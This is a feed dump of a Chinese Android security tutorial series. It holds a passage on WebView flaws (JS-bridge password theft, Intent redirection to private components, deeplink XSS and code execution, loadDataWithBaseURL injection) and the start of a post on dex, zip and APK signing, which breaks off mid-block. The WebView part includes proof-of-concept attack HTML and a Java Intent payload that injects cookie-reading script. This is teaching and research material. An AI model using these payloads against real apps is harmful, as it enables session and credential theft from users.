class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;WebView Atack&lt;/title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">         function <span class="title function_">callAndroid</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span><br><span class="line">            <span class="type">var</span> <span class="variable">password</span> <span class="operator">=</span> test.getPassword();</span><br><span class="line">document.getElementById(<span class="string">&quot;getdata&quot;</span>).innerHTML= password;</span><br><span class="line">         &#125;</span><br><span class="line">     &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;p id=<span class="string">&quot;getdata&quot;</span>&gt;攻击获得的数据将显示在此……&lt;/p&gt;</span><br><span class="line">   &lt;!--点击按钮则调用callAndroid函数--&gt;</span><br><span class="line">   &lt;button type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;button1&quot;</span> onclick=<span class="string">&quot;callAndroid()&quot;</span>&gt;CIntent Attack!&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后启动http_server</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/33.png" alt="image-20220729172309137"></p><p>此时我们启动攻击样本，并点击按钮</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/34.png" alt="image-20220729172422110"></p><p>这里我们可以成功的加载我们的页面说明恶意html注入成功</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/35.png" alt="image-20220729172443186"></p><p>然后我们再次点击js中的按钮，就可以获取敏感数据</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/36.png" alt="image-20220729172552889"></p><p>这里就获取的敏感的数据</p><h4 id="（2）Intent重定向导致launchAnyWhere漏洞"><a href="#（2）Intent重定向导致launchAnyWhere漏洞" class="headerlink" title="（2）Intent重定向导致launchAnyWhere漏洞"></a>（2）Intent重定向导致launchAnyWhere漏洞</h4><p><strong>漏洞原理：</strong></p><p>我们都知道Android中的组件需要导出才能够访问，而导出的组件往往存在一定的安全问题。</p><p>导出的组件一般有以下三种形式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为<span class="literal">true</span>;</span><br><span class="line"><span class="number">2.</span>如果组件没有显式设置android:exported为<span class="literal">false</span>，但是其intent-filter以及action存在，则也为导出组件</span><br><span class="line"><span class="number">3.</span>API Level在<span class="number">17</span>以下的所有App的provider组件的android:exported属性默认值为<span class="literal">true</span>，<span class="number">17</span>及以上默认值为<span class="literal">false</span>。</span><br></pre></td></tr></table></figure><p>未导出的组件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">组件显式设置android:exported=<span class="string">&quot;false&quot;</span> </span><br><span class="line">组件没有intent-filter, 且没有显式设置android:exported的属性值，默认为非导出的;</span><br><span class="line">组件虽然配置了intent-filter,，但是显式设置android:exported=<span class="string">&quot;false&quot;</span></span><br></pre></td></tr></table></figure><p>而通过一定的方法可以访问未导出的组件，我们将这种漏洞成为<code>launchAnyWhere</code>漏洞</p><p>Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起<code>launchAnyWhere</code>漏洞</p><p><strong>漏洞复现：</strong></p><p>我们查看一个样本案例：</p><p>首先是不可导出组件PrivateActivity:</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/53.png" alt="image-20220730124850689"></p><p>然后可导出的组件：WebView2Activity</p><p>代码层的校验代码：</p><p><code>WebView2Activity</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/54.png" alt="image-20220730125041041"></p><p><code>PrivateActivity</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/55.png" alt="image-20220730125108657"></p><p>然后我们编写攻击代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/56.png" alt="image-20220730125254413"></p><p>效果如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/57.png" alt="image-20220730125323004"></p><p>可以看出我们通过WebView+Intent重定向就可以访问私有组件，从而实现launchAnyWhere漏洞</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/58.png" alt="image-20220730125359818"></p><h3 id="5-Deeplink-WebView漏洞"><a href="#5-Deeplink-WebView漏洞" class="headerlink" title="5.Deeplink+WebView漏洞"></a>5.Deeplink+WebView漏洞</h3><p>deeplink 是一种在网页中启动App的超链接。当用户点击deeplink链接时，Android系统会启动注册该deeplink的应用，打开在Manifest文件中注册该deeplink的activity。</p><p>deeplink在APP中会导致多类漏洞：通过deeplink操纵WebView造成的远程代码执行、敏感信息泄露、应用克隆、launchAnyWhere等漏洞。</p><h4 id="（1）任意代码执行漏洞"><a href="#（1）任意代码执行漏洞" class="headerlink" title="（1）任意代码执行漏洞"></a>（1）任意代码执行漏洞</h4><p><strong>漏洞原理：</strong></p><p>样本代码层通过反射调用去安装的列表中搜索安装的应用，然后去调用其方法进行实现，我们可以构造相同的包名，然后将攻击样本去安装到手机上，是的应用触发任意代码执行漏洞</p><p><strong>漏洞复现：</strong></p><p>样本代码段：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/59.png" alt="image-20220730125800892"></p><p>我们构造Poc：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/60.png" alt="image-20220730125820419"></p><p>注意这里我们要保证构造的攻击应用的包名和代码中校验的一致才能触发，然后我们启动，可以发现成功的触发了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/61.png" alt="image-20220730125901727"></p><p><strong>漏洞防护：</strong></p><p>需要对具体的包名进行校验，并对DeepLink进行过滤</p><h4 id="（2）XSS注入漏洞"><a href="#（2）XSS注入漏洞" class="headerlink" title="（2）XSS注入漏洞"></a>（2）XSS注入漏洞</h4><p><strong>漏洞原理：</strong></p><p>这也是我们结合Deeplink+WebView导致的一个漏洞问题，我们可以通过构造含深度调用链的JS，然后通过加载去实现XSS注入</p><p><strong>漏洞复现：</strong></p><p>首先我们查看样本的DeepLinks</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/62.png" alt="image-20220730130234190"></p><p>然后我们可以发现样本的代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/63.png" alt="image-20220730130256549"></p><p>我们构造攻击脚本：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/64.png" alt="image-20220730130336427"></p><p>然后我们通过去访问该html:</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/65.png" alt="image-20220730130416578"></p><p>接着我们使用目标样本打开：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/66.png" alt="image-20220730130442740"></p><p>即可以成功的进行XSS注入</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/67.png" alt="image-20220730130506890"></p><h4 id="（3）DeepLinks在WebView上的组合漏洞"><a href="#（3）DeepLinks在WebView上的组合漏洞" class="headerlink" title="（3）DeepLinks在WebView上的组合漏洞"></a>（3）DeepLinks在WebView上的组合漏洞</h4><p>我们前面分析了很多DeepLinks在WebView上的漏洞，我们还可以将这些漏洞组合使用，我在测试一款银行的样本中发现组合漏洞：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/68.png" alt="image-20220730130714437"></p><p>这个结合了前面我们讲的网络漏洞、路径穿越、XSS、WebView漏洞，具体的大家可以去听我在平安SRC&amp;&amp;看雪的沙龙会议中的演讲。</p><p>以及我在网上收集的一个大佬的文章，描述的漏洞利用流程，大家可以参考：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/76.png" alt="image-20220730141930818"></p><p>参考文章：<a href="http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/">APP漏洞利用组合拳——应用克隆案例分析</a></p><h4 id="（4）loadDataWithBaseURL漏洞"><a href="#（4）loadDataWithBaseURL漏洞" class="headerlink" title="（4）loadDataWithBaseURL漏洞"></a>（4）loadDataWithBaseURL漏洞</h4><p>当<code>loadDataWithBaseURL</code>的域名和内容同时可控是，可以构造任意域下的XSS</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">loadDataWithBaseURL</span> </span><br><span class="line"><span class="params">(String baseUrl,</span></span><br><span class="line"><span class="params">String data, </span></span><br><span class="line"><span class="params">String mimeType, </span></span><br><span class="line"><span class="params">String encoding,</span></span><br><span class="line"><span class="params">String historyUrl)</span></span><br></pre></td></tr></table></figure><p>除了明显的情况外，攻击者控制调用中的<code>baseUri</code>和参数<code>data</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webView.loadDataWithBaseURL(<span class="string">&quot;https://google.com/&quot;</span>,</span><br><span class="line">           <span class="string">&quot;&lt;script&gt;document.write(document.domain)&lt;/script&gt;&quot;</span>,</span><br><span class="line">           <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p><strong>漏洞原理：</strong></p><p>deeplink加载任意fragment，转化为WebView loadDataWithBaseURL漏洞</p><p><strong>漏洞复现：</strong></p><p>实现步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)victim-app://c/contact/2?fragmen_class=&lt;fragment&gt;可启动任意fragment，并可 通过Intent Extra传参</span><br><span class="line">(2)寻找到⼀个带WebView的Fragment：GoogleMapWebViewFragment</span><br><span class="line">(3)可污染loadDataWithBaseURL的前两个参数，构造victim.com域下的XSS</span><br><span class="line">webview.loadDataWithBaseURL(&quot;victim.com&quot;,&quot;google-map.html&quot;,&quot;text/html&quot;,...);</span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_VIEW); </span><br><span class="line">payload.setData(Uri.parse(<span class="string">&quot;victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment&quot;</span>)); </span><br><span class="line"><span class="type">Bundle</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>(); </span><br><span class="line">extra.putString(<span class="string">&quot;map_url&quot;</span>, <span class="string">&quot;\&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;script&gt;&quot;</span>); </span><br><span class="line">extra.putString(<span class="string">&quot;map_file_name&quot;</span>, <span class="string">&quot;google_map.html&quot;</span>); </span><br><span class="line">extra.putString(<span class="string">&quot;map_domain&quot;</span>, <span class="string">&quot;https://www.victim-app.com&quot;</span>); </span><br><span class="line">payload.putExtra(<span class="string">&quot;bundle&quot;</span>, extra); </span><br><span class="line">startActivity(payload);</span><br></pre></td></tr></table></figure><p>可以通过这个deeplink打开任意fragment的漏洞，实现可控任意域执行任意JS，实现盗取登陆态的用户cookie！</p><p>具体参考：<a href="https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA">Android中的特殊攻击面（二）——危险的deeplink</a></p><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文我编写了很久，主要是一些案例和网上的漏洞复现需要大量的时间去做，很多案例和攻击poc，我都进行了手动编写，一些网上已有的大佬的文章样例，我也进行了一一的复现，将一些不能复现的全部剔除，WebView漏洞是Android APP上当前十分重要的漏洞，漏洞的种类十分多，本文归纳了20多种类别的漏洞并进行了一一的复现，具体漏洞扩展，大家可以参考后面的文献，而实验的poc和攻击样本我也会上传知识星球和github。</p><p>github网址：<a href="https://github.com/WindXaa">WindXaa</a></p><h2 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h2><p>会议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020 看雪SDC  Android WebView安全攻防指南2020</span><br></pre></td></tr></table></figure><p>WebView的原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://ljd1996.github.io/2020/12/01/Android-WebView%E7%AC%94%E8%AE%B0/</span><br><span class="line">https://blog.csdn.net/carson_ho/article/details/64904691</span><br><span class="line">https://juejin.cn/post/6844903564737789965#heading-9</span><br><span class="line">https://www.cnblogs.com/linhaostudy/p/14617314.html</span><br><span class="line">https://mabin004.github.io/2018/06/11/Android-JsBridge/</span><br></pre></td></tr></table></figure><p>远程代码执行漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://cloud.tencent.com/developer/article/1394368</span><br><span class="line">https://blog.csdn.net/weixin_39190897/article/details/125107626</span><br></pre></td></tr></table></figure><p>WebView跨域漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://blogs.360.cn/post/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.html</span><br><span class="line">https://blog.csdn.net/qq_35993502/article/details/121371049</span><br><span class="line">https://bbs.pediy.com/thread-269849.htm</span><br><span class="line">https://forum.butian.net/share/1562</span><br></pre></td></tr></table></figure><p>URL配置漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/terminal/201407.html</span><br><span class="line">https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</span><br><span class="line">https://www.freebuf.com/articles/web/208868.html</span><br></pre></td></tr></table></figure><p>Intent Scheme绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://drops.xmd5.com/static/drops/papers-2893.html</span><br><span class="line">https://blog.csdn.net/l173864930/article/details/36951805</span><br></pre></td></tr></table></figure><p>Intent:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blogs.360.cn/post/launchanywhere-google-bug-7699048.html</span><br><span class="line">http://drops.xmd5.com/static/drops/papers-2893.html</span><br></pre></td></tr></table></figure><p>deeplink:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA?</span><br><span class="line">http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;快半个月没有更新文章了，最近不少朋友催更了，今天我们进入Android APP漏洞之战系列文章中的一个重要篇幅——WebView漏洞，我们都知道在当下App漏洞中，WebView漏洞的占比是十分巨大的，各种类型的漏洞问题层出不穷，这篇文章就带着大家一起揭开WebView漏洞神奇的面纱。&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（19）——插件化漏洞与解压缩漏洞详解</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0019/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0019/</id>
    <published>2023-02-14T01:07:19.000Z</published>
    <updated>2023-12-23T09:13:44.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>最近一直处于忙碌的状态，花了很长一段时间，抽出碎片时间才将这篇帖子写完，本文结合上文的动态加载文章一起学习，本文主要讲述Android中存在的插件化漏洞、签名机制漏洞、解压缩漏洞等，并对一些经典的漏洞进行了复现，本文的相关实验文件由于太多，后面都会上传到知识星球</p><span id="more"></span><p>本文第二节主要讲述Dex文件结构、Zip文件结构、Android签名机制</p><p>本文第三节主要讲述插件化漏洞和解压缩漏洞的安全场景</p><p>本文第四节主要对插件化漏洞进行讲述</p><p>本文第五节主要对解压缩漏洞进行讲述</p><p>本文第六节主要对Janus漏洞原理进行讲述</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><h3 id="1-Dex文件基本结构"><a href="#1-Dex文件基本结构" class="headerlink" title="1.Dex文件基本结构"></a>1.Dex文件基本结构</h3><p>dex文件是anroid虚拟机Dalik运行的一种文件，包含应用程序的全部操作指令以及运行时数据，下面我们看下.class文件和.dex文件的区别：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/2.png"></p><p>我们可以发现dex文件将原来每个文件都有的共有信息合成一体，从而减少了class的冗余</p><p>下面我们进一步详细看dex文件结构</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/3.png"></p><p>我们可以发现dex文件主要由3大部分组成，分别是：<code>文件头、索引区、数据区</code>。其中索引区主要包括字符串、类型、方法、域、方法的索引。数据区主要包括类的定义、数据区、链路数据区</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/4.png"></p><p>上面我们可以看出Dex文件由许多部分组成，其中Dex Header最为重要，因为Dex的其他组成部分，都需要通过Dex Header中的索引才能找到</p><h4 id="（1）Dex-Header"><a href="#（1）Dex-Header" class="headerlink" title="（1）Dex Header"></a>（1）Dex Header</h4><p>dex文件头一般固定为0x70个字节大小，包括标志、版本号、校验码、sha-1签名以及其他一些方法、类的数量和偏移地址等信息。如图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/5.png"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/6.png"></p><p>结合上面的两张图进行对照，下面我们进一步详细的描述dex文件的结构</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/7.png"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/8.png"></p><h4 id="（2）索引区"><a href="#（2）索引区" class="headerlink" title="（2）索引区"></a>（2）索引区</h4><p>dex文件索引区主要是对一些字符串、类型、方法、域、方法的索引，方法可以查找到对应的数据位置</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/9.png" alt="image-20220221104633099"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/10.png" alt="image-20220221103446888"></p><h4 id="（3）数据区"><a href="#（3）数据区" class="headerlink" title="（3）数据区"></a>（3）数据区</h4><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/11.png" alt="image-20220221105433209"></p><p>数据区一般包括类的定义区、数据区、链接数据区。类的定义区一般存放dex文件中一些类对象的声明，数据区则存放代码原数据，链接数据区一般提供从索引区到数据区的链接映射关系</p><h3 id="2-Zip文件结构"><a href="#2-Zip文件结构" class="headerlink" title="2. Zip文件结构"></a>2. Zip文件结构</h3><p>zip文件是比较常见的压缩文件，我们先来看一下zip文件的基本结构图：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/12.png" alt="image-20220221111055116"></p><p>通过图中我们可以看出，zip文件一般分为三个部分：源文件数据存储区、中心目录区、中心目录结束标识</p><h4 id="（1）源文件数据存储区"><a href="#（1）源文件数据存储区" class="headerlink" title="（1）源文件数据存储区"></a>（1）源文件数据存储区</h4><p>记录着压缩的所有文件的内容信息，其数据组织结构是每个文件都由local file header、file data、data descriptor三部分组成</p><h5 id="lt-1-gt-file-header"><a href="#lt-1-gt-file-header" class="headerlink" title="&lt;1&gt; file header"></a>&lt;1&gt; file header</h5><p>用于标识文件的开始，文件结构如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/13.png" alt="image-20220221111755433"></p><h5 id="lt-2-gt-file-data"><a href="#lt-2-gt-file-data" class="headerlink" title="&lt;2&gt;file data"></a>&lt;2&gt;file data</h5><p>主要存放相应的压缩文件的源数据</p><h5 id="lt-3-gt-data-descriptor"><a href="#lt-3-gt-data-descriptor" class="headerlink" title="&lt;3&gt;data descriptor"></a>&lt;3&gt;data descriptor</h5><p>一般用于标识该文件压缩结束，该结构只有在相应的header中通用标记字段的第３位设为１时才会出现，紧接在压缩文件源数据后。这个数据描述符只用在不能对输出的 ZIP 文件进行检索时使用。例如：在一个不能检索的驱动器（如：磁带机上）上的 ZIP 文件中。如果是磁盘上的ZIP文件一般没有这个数据描述符。</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/14.png" alt="image-20220221112109956"></p><h4 id="（2）中心目录区"><a href="#（2）中心目录区" class="headerlink" title="（2）中心目录区"></a>（2）中心目录区</h4><p>对于待压缩的目录而言，每一个子目录对应一个压缩目录源数据，记录该目录的描述信息。压缩包中所有目录源数据连续存储在整个归档包的最后，这样便于向包中追加新的文件。头部的结构如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/15.png" alt="image-20220221112226588"></p><h4 id="（3）中心目录结束标识"><a href="#（3）中心目录结束标识" class="headerlink" title="（3）中心目录结束标识"></a>（3）中心目录结束标识</h4><p>目录结束标识存在于整个归档包的结尾，用于标记压缩的目录数据的结束，结构如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/16.png" alt="image-20220221112404675"></p><h3 id="3-Android-APK签名机制"><a href="#3-Android-APK签名机制" class="headerlink" title="3.Android APK签名机制"></a>3.Android APK签名机制</h3><p>应用签名主要是避免外部恶意解压、破解或者反编译修改内容，签名的本质是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">认证：Android 平台上运行的每个应用都必须有开发者的签名。在安装应用时，软件包管理器会验证 APK 是否已经过适当签名，安装程序会拒绝没有获得签名就尝试安装应用</span><br><span class="line">验证完整性：软件包管理器在安装应用前会验证应用摘要，如果破解者修改了 apk 里的内容，那么摘要就不再匹配，验证失败</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/17.png" alt="image-20220221141751025"></p><h4 id="（1）应用签名方案类型"><a href="#（1）应用签名方案类型" class="headerlink" title="（1）应用签名方案类型"></a>（1）应用签名方案类型</h4><p>截止到Android12，Android支持三种应用签名方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1:基于jar签名</span><br><span class="line">v2:提高验证性能&amp;覆盖范围（Android 7.0 Nougat引入）</span><br><span class="line">v3:支持密钥轮换（Android 9.0 Pie引入）</span><br></pre></td></tr></table></figure><p>为了提高兼容性，必须按照v1,v2,v3的先后顺序采用签名方案，低版本平台会忽略高版本的签名方案在APK中添加额外数据，具体流程图如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/18.png" alt="image-20220221141751025"></p><h5 id="lt-1-gt-签名方案v1"><a href="#lt-1-gt-签名方案v1" class="headerlink" title="&lt;1&gt;签名方案v1"></a>&lt;1&gt;签名方案v1</h5><p>最基本的签名方案，是基于Jar的签名</p><p>v1签名后会增加META-INF文件夹，其中会有如下三个文件：</p><table><thead><tr><th>文件</th><th>描述</th></tr></thead><tbody><tr><td><strong>「MANIFEST.MF」</strong></td><td>记录「apk 中每一个文件对应的摘要」（除了 META-INF 文件夹）</td></tr><tr><td><strong>「*.SF」</strong></td><td>记录「MANIFEST.MF 文件的摘要」和「MANIFEST.MF 中每个数据块的摘要」</td></tr><tr><td><strong>「*.RSA」</strong></td><td>包含了「*.SF 文件的签名」和「包含公钥的开发者证书」</td></tr></tbody></table><p>v1签名流程：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/19.png" alt="image-20220221142628252"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）计算每个文件的 SHA-<span class="number">1</span> 摘要，进行 BASE64 编码后写入摘要文件，即 MANIFEST.MF 文件；</span><br><span class="line">（<span class="number">2</span>）计算整个 MANIFEST.MF 文件的 SHA-<span class="number">1</span> 摘要，进行 BASE64 编码后写入签名文件，即*.SF 文件；</span><br><span class="line">（<span class="number">3</span>）计算 MANIFEST.MF 文件中每一块摘要的 SHA-<span class="number">1</span> 摘要，进行 BASE64 编码后写入 签名文件，即*.SF 文件；</span><br><span class="line">（<span class="number">4</span>）计算整个 *.SF 文件的数字签名（先摘要再私钥加密）；</span><br><span class="line">（<span class="number">5</span>）将数字签名和 X<span class="number">.509</span> 开发者数字证书（公钥）写入 *.RSA 文件；</span><br></pre></td></tr></table></figure><p>验证流程：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/20.png" alt="image-20220221143020002"></p><p>主要包括验证签名、校验完整性两个步骤：</p><p>步骤1：验证签名步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）取出*.RSA 中包含的开发者证书，并校验其合法性</span><br><span class="line">（2）用证书中的公钥解密*.RSA中包含的签名</span><br><span class="line">（3）用证书中的公钥计算*.SF的签名</span><br><span class="line">（4）对比（2）和（3）的签名是否一致</span><br></pre></td></tr></table></figure><p>步骤2：验证完整性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）检查 APK 中包含的所有文件，对应的摘要值与 MANIFEST.MF 文件中记录的值一致</span><br><span class="line">（<span class="number">2</span>）使用证书文件（RSA 文件）检验签名文件（SF 文件）没有被修改过</span><br><span class="line">（<span class="number">3</span>）使用签名文件（SF 文件）检验 MF 文件没有被修改过</span><br></pre></td></tr></table></figure><p>上面任何一个步骤验证失败，则整个APK验证失败</p><p>问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">覆盖范围不足：Zip 文件中部分内容不在验证范围，例如 META-INF 文件夹；</span><br><span class="line">验证性能差：验证程序必须解压所有压缩的条目，这需要花费更多时间和内存</span><br><span class="line">存在Janus漏洞：恶意开发人员可以通过Janus漏洞去绕过Android 的v1签名验证机制</span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-签名方案v2"><a href="#lt-2-gt-签名方案v2" class="headerlink" title="&lt;2&gt;签名方案v2"></a>&lt;2&gt;签名方案v2</h5><p>Android7.0 中开始引入了APK签名方案v2，一种全文件签名方案，该方案能够发现对APK的受保护部分进行所有更改，相比v1来说校验速度更快，覆盖的范围也更广。但是考虑到版本兼容的问题，所以一般常见了v1+v2的混合签名模式</p><p>我们由上文知道Zip文件主体分为：<code>源文件数据存储区、中心目录区、中心目录结束标识</code>。EoCD中记录了中央目录的起始位置，在<code>源文件数据存储区</code>和<code>中心目录区</code>插入其他数据不会影响Zip的解压</p><p>因此v2签名后会在<code>源文件数据存储区</code>和<code>中心目录区</code>插入APK 签名分块（APK Signing Block）</p><p>如下图所示。从左到右边，我们定义为区块 1~4</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/21.png" alt="image-20220221151257690"></p><p>v2签名块（APK Signing Block）本身又主要分成三部分:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 